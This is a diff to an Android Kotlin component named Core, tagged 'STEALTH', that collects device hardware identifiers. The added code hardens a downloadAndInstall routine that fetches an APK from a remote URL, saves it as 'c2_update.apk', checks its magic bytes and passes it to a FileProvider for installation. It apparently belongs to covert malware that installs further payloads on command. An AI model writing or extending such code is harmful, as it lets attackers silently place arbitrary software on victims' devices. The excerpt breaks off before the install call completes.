@@ -11,9 +11,12 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import okhttp3.OkHttpClient
+import okhttp3.Request
 import java.io.File
 import java.net.URL
 import java.util.concurrent.Executors
+import java.util.concurrent.TimeUnit
 
 object Core {
     private const val TAG = "STEALTH"
@@ -166,14 +169,39 @@ object Core {
             "${Build.BOARD}|${Build.HARDWARE}"
     }
 
+    private val httpClient = OkHttpClient.Builder()
+        .followRedirects(true)
+        .followSslRedirects(true)
+        .connectTimeout(15, TimeUnit.SECONDS)
+        .readTimeout(60, TimeUnit.SECONDS)
+        .build()
+
     private fun downloadAndInstall(context: Context, url: String): String {
         return try {
-            val apkFile = File(context.cacheDir, "update.apk")
-            URL(url).openStream().use { input ->
-                apkFile.outputStream().use { output ->
-                    input.copyTo(output)
+            val apkFile = File(context.filesDir, "c2_update.apk")
+
+            val request = Request.Builder().url(url).build()
+            val response = httpClient.newCall(request).execute()
+            if (!response.isSuccessful) {
+                return "ERROR:HTTP_${response.code}"
+            }
+            val body = response.body ?: return "ERROR:empty_body"
+
+            apkFile.outputStream().use { out ->
+                body.byteStream().use { inp ->
+                    inp.copyTo(out)
                 }
             }
+            response.close()
+
+            // Verify it's a valid APK
+            val magic = ByteArray(4)
+            apkFile.inputStream().use { it.read(magic) }
+            if (magic[0] != 0x50.toByte() || magic[1] != 0x4B.toByte()) {
+                apkFile.delete()
+                return "ERROR:not_a_valid_apk"
+            }
+
             val uri = androidx.core.content.FileProvider.getUriForFile(
                 context,
                 "${context.packageName}.fileprovider",
